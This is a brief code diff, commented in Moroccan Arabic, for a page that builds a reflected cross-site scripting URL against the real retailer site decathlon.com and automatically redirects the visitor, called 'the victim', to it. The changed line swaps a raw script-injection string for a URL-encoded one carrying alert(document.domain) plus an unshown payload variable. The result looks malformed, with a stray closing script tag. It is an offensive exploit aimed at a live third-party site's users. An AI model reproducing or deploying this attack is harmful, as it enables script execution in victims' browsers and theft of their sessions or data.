@@ -12,7 +12,7 @@
             
             // الرابط الملعون ديال Decathlon مع الـ XSS اللي لقيتي
             // استعملنا </h1></title> باش نهربو من السجن ديال الكود
-            var targetUrl = "https://www.decathlon.com/search?q=</h1></title><script>" + payload + "<\/script>";
+            var targetUrl = "https://www.decathlon.com/search?q=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E" + payload + "<\/script>";
 
             // توجيه الضحية للرابط أوتوماتيكياً
             window.location.href = targetUrl;
